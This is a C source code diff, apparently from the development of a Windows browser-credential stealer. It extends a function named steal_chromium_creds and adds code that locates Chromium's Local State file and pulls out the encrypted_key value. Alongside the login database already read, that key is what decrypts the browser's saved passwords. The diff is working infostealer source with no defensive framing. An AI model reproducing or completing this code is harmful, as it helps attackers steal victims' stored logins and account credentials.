@@ -29,16 +29,15 @@ PWSTR get_localappdata_path() {
   return appDataPath;
 }
 
-// Return the full path that points to the sqlite database containing logins
-PWSTR build_logindata_path(const PWSTR appDataPath,
-                           const wchar_t *additionalPath) {
-  size_t totalLength = wcslen(appDataPath) + wcslen(additionalPath) + 1;
+// Return the concatenation of `path` and `additionalPath`
+PWSTR build_path(const PWSTR path, const wchar_t *additionalPath) {
+  size_t totalLength = wcslen(path) + wcslen(additionalPath) + 1;
   PWSTR fullPath = (PWSTR)malloc(totalLength * sizeof(wchar_t));
   if (!fullPath) {
     fprintf(stderr, "malloc errored out");
   }
 
-  wcscpy(fullPath, appDataPath);
+  wcscpy(fullPath, path);
   wcscat(fullPath, additionalPath);
   return fullPath;
 }
@@ -118,13 +117,117 @@ void free_logins(LoginInfo *logins, int count) {
   free(logins);
 }
 
+// Should work all the time (upcasting == less problems)
+// Allocates a PWSTR that should be freed
+PWSTR ansi_to_wide(PSTR ansiString) {
+  if (!ansiString) {
+    return NULL;
+  }
+
+  int wideCharCount = MultiByteToWideChar(CP_ACP, 0, ansiString, -1, NULL, 0);
+  if (wideCharCount == 0) {
+    fprintf(stderr, "Failed to get wide character count. Error code: %lu\n",
+            GetLastError());
+    return NULL;
+  }
+
+  PWSTR wideString = (PWSTR)malloc(wideCharCount * sizeof(wchar_t));
+  if (!wideString) {
+    fprintf(stderr, "Failed to allocate memory for wide string.\n");
+    return NULL;
+  }
+
+  if (MultiByteToWideChar(CP_ACP, 0, ansiString, -1, wideString,
+                          wideCharCount) == 0) {
+    fprintf(stderr, "Failed to convert ANSI to wide string. Error code: %lu\n",
+            GetLastError());
+    free(wideString);
+    return NULL;
+  }
+
+  return wideString;
+}
+
+PWSTR retrieve_encrypted_key(PWSTR filepath) {
+  HANDLE hFile = CreateFileW(filepath, GENERIC_READ, FILE_SHARE_READ, NULL,
+                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  if (hFile == INVALID_HANDLE_VALUE) {
+    printf("Failed to open file. Error code: %lu\n", GetLastError());
+    return NULL;
+  }
+
+  DWORD fileSize = GetFileSize(hFile, NULL);
+  if (fileSize == INVALID_FILE_SIZE) {
+    printf("Failed to get file size. Error code: %lu\n", GetLastError());
+    CloseHandle(hFile);
+    return NULL;
+  }
+
+  // characters in the file are encoded in ASCII, we can't use wide characters
+  // here so we will only convert the final result, later on for compatibility
+  PSTR buffer = (PSTR)malloc(fileSize + 1);
+  if (!buffer) {
+    printf("Failed to allocate memory for file buffer.\n");
+    CloseHandle(hFile);
+    return NULL;
+  }
+
+  DWORD bytesRead;
+  if (!ReadFile(hFile, buffer, fileSize * sizeof(char), &bytesRead, NULL)) {
+    printf("Failed to read file. Error code: %lu\n", GetLastError());
+    free(buffer);
+    CloseHandle(hFile);
+    return NULL;
+  }
+  CloseHandle(hFile);
+
+  buffer[fileSize] = '\0';  // terminate the buffer
+
+  const char *key = "encrypted_key\":";
+  PSTR pos = strstr(buffer, key);
+  if (!pos) {
+    free(buffer);
+    return NULL;
+  }
+
+  // skip the key
+  pos += strlen(key);
+  // skip whitespace
+  while (*pos == ' ' || *pos == '\t' || *pos == '\n' || *pos == '\r') {
+    pos++;
+  }
+
+  // keep start position of the encrypted key
+  PSTR start = pos;
+  // pos points to the end of the encrypted key (to get the length)
+  while (*pos != ' ' && *pos != '\t' && *pos != '\n' && *pos != '\r' &&
+         *pos != '\0' && *pos != ',' && *pos != '}') {
+    pos++;
+  }
+
+  size_t length = pos - start;
+  PSTR encryptedKey = (PSTR)malloc(length + 1);
+  if (!encryptedKey) {
+    free(buffer);
+    return NULL;
+  }
+
+  strncpy(encryptedKey, start, length);
+  encryptedKey[length] = '\0';
+
+  PWSTR wide_encrypted_key = ansi_to_wide(encryptedKey);
+
+  free(buffer);
+  return wide_encrypted_key;
+}
+
 int steal_chromium_creds() {
   PWSTR appDataPath = get_localappdata_path();
   if (!appDataPath) {
     return EXIT_FAILURE;
   }
 
-  PWSTR fullPath = build_logindata_path(appDataPath, LOGINDATA_PATH);
+  PWSTR fullPath = build_path(appDataPath, LOGINDATA_PATH);
   if (!fullPath) {
     CoTaskMemFree(
         appDataPath);  // free memory from the call to SHGetKnownFolderPath in
@@ -151,7 +254,17 @@ int steal_chromium_creds() {
   }
   printf("====================\n");
 
+  PWSTR login_state_path = build_path(appDataPath, LOCAL_STATE_FILE);
+  wprintf(L"%ls\n", login_state_path);
+  PWSTR encrypted_key = retrieve_encrypted_key(login_state_path);
+  if (!encrypted_key) {
+    fprintf(stderr, "All shit has gone");
+  }
+
+  wprintf(L"Encrypted key: %ls\n", encrypted_key);
+
   free_logins(logins, count);
+  free(encrypted_key);  // allocated in ansi_to_wide
   free(fullPath);
   CoTaskMemFree(
       appDataPath);  // free memory from the call to SHGetKnownFolderPath in
